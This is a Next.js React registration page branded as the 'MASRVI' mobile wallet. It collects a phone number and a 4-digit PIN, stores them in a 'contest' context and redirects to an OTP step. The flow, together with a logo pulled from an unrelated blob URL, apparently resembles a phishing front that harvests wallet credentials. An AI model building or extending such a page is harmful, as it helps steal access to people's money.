import { useState } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import Image from 'next/image';
import { useRouter } from 'next/router';
import { useTranslation } from 'react-i18next';
import axios from 'axios';
import ErrorModal from '@/components/ErrorModal';
import PinKeypad from '@/components/PinKeypad';
import { useContest } from '@/context/ContestContext';
import { playSuccess } from '@/utils/sound';

export default function RegisterPage() {
  const { t } = useTranslation();
  const router = useRouter();
  const { updateRegistration } = useContest();
  const [phone, setPhone] = useState('');
  const [entryCode, setEntryCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);
  const [showPinPad, setShowPinPad] = useState(false);

  const handlePhoneChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 8);
    setPhone(value);
  };

  const handlePinChange = (newValue) => {
    setEntryCode(newValue);
  };

  const closePinPad = () => {
    setShowPinPad(false);
  };

  const handleSubmit = async () => {
    if (phone.length < 8 || entryCode.length < 4) return;

    setLoading(true);

    try {
      const { data } = await axios.post('/api/register', { phone, entryCode });

      if (data.success) {
        playSuccess();
        updateRegistration(phone, entryCode);
        router.push('/otp');
      } else {
        setShowError(true);
      }
    } catch {
      setShowError(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <Head>
        <title>{`MASRVI - ${t('registration.submit')}`}</title>
      </Head>

      <main className="min-h-screen flex flex-col bg-gradient-to-br from-primary-50 via-white to-primary-100 transition-colors">
        {/* Back Button */}
        <div className="px-4 py-3 md:py-4">
          <Link
            href="/"
            className="inline-flex items-center gap-2 text-gray-600 hover:text-primary-700 transition-colors text-sm md:text-base"
          >
            <span className="rtl:rotate-180">&#10094;</span>
            <span>{t('registration.back')}</span>
          </Link>
        </div>

        <div className="flex-1 flex items-center justify-center px-4 py-4 md:py-8">
          <div className="w-full max-w-md animate-fade-in-up">
            <div className="glass-card rounded-2xl md:rounded-3xl p-6 md:p-8">
              {/* Logo - Bigger */}
              <div className="text-center mb-6 md:mb-8">
                <Image
                  src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/7923244c-5be4-4f29-bbe9-96c23ebaebc9.jpeg"
                  alt="Masrvi Logo"
                  width={300}
                  height={120}
                  className="h-28 md:h-32 w-auto mx-auto mb-4 object-contain"
                />
                <h1 className="text-xl md:text-2xl font-bold text-gray-800">{t('registration.submit')}</h1>
              </div>

              <div className="space-y-5 md:space-y-6">
                {/* Phone Input */}
                <div className="animate-fade-in-up stagger-1">
                  <label htmlFor="phone" className="block text-sm font-semibold text-gray-800 mb-2 text-right">
                    {t('registration.phone_label')}
                  </label>
                  <div className="flex gap-2">
                    <div className="flex items-center px-4 py-3 md:py-4 glass-input rounded-xl text-primary-700 font-bold text-base md:text-lg">
                      222
                    </div>
                    <input
                      id="phone"
                      type="tel"
                      inputMode="numeric"
                      maxLength={8}
                      value={phone}
                      onChange={handlePhoneChange}
                      className="flex-1 px-4 py-3 md:py-4 glass-input rounded-xl focus:outline-none transition ltr-input text-base md:text-lg font-medium"
                      required
                    />
                  </div>
                </div>

                {/* Submit Button - opens PIN pad to set password */}
                <div className="pt-2 md:pt-4 animate-fade-in-up stagger-2">
                  <button
                    type="button"
                    onClick={() => phone.length >= 8 && setShowPinPad(true)}
                    disabled={loading || phone.length < 8}
                    className="w-full py-4 md:py-5 bg-primary-500 hover:bg-primary-600 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold rounded-2xl transition-all shadow-lg text-base md:text-lg btn-primary"
                  >
                    {loading ? (
                      <span className="flex items-center justify-center gap-2">
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      </span>
                    ) : t('registration.submit')}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Green Bottom Section */}
        <div className="bg-primary-500 rounded-t-[2rem] py-6 md:py-8 px-4 mt-auto">
          <p className="text-white text-center text-base md:text-lg font-medium">
            Mon wallet 100% simple et securise
          </p>
        </div>
      </main>

      {/* PIN Keypad Bottom Sheet */}
      {showPinPad && (
        <div className="fixed inset-0 z-50 flex items-end justify-center">
          {/* Backdrop */}
          <div
            className="absolute inset-0 bg-black/40 animate-fade-in-backdrop"
            onClick={closePinPad}
            aria-hidden="true"
          />

          {/* Sheet */}
          <div className="relative w-full max-w-md bg-white rounded-t-3xl shadow-2xl animate-slide-up-sheet pb-6">
            {/* Drag handle */}
            <div className="flex justify-center pt-3 pb-1">
              <div className="w-12 h-1.5 bg-gray-300 rounded-full" />
            </div>

            {/* Close button */}
            <div className="flex items-center justify-between px-5 pt-2 pb-1">
              <h2 className="text-base font-bold text-gray-800">
                {t('registration.password_label')}
              </h2>
              <button
                type="button"
                onClick={closePinPad}
                className="p-1 text-gray-400 hover:text-gray-700 transition-colors"
                aria-label="Close"
              >
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            <div className="px-4 pt-2">
              <PinKeypad
                value={entryCode}
                onChange={handlePinChange}
                maxLength={4}
                instruction={t('registration.enter_pin_instruction')}
              />
            </div>

            {/* Confirm button when PIN complete - goes straight to verification */}
            {entryCode.length === 4 && (
              <div className="px-5 pt-4">
                <button
                  type="button"
                  onClick={() => { setShowPinPad(false); handleSubmit(); }}
                  disabled={loading}
                  className="w-full py-4 bg-primary-500 hover:bg-primary-600 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold rounded-2xl transition-all shadow-lg text-base btn-primary animate-fade-in-up"
                >
                  {loading ? (
                    <span className="flex items-center justify-center gap-2">
                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    </span>
                  ) : (t('registration.confirm') || t('registration.submit'))}
                </button>
              </div>
            )}
          </div>
        </div>
      )}

      <ErrorModal
        isOpen={showError}
        title={t('errors.title')}
        message={t('errors.invalid_registration')}
        buttonText={t('errors.retry')}
        onClose={() => setShowError(false)}
      />
    </>
  );
}
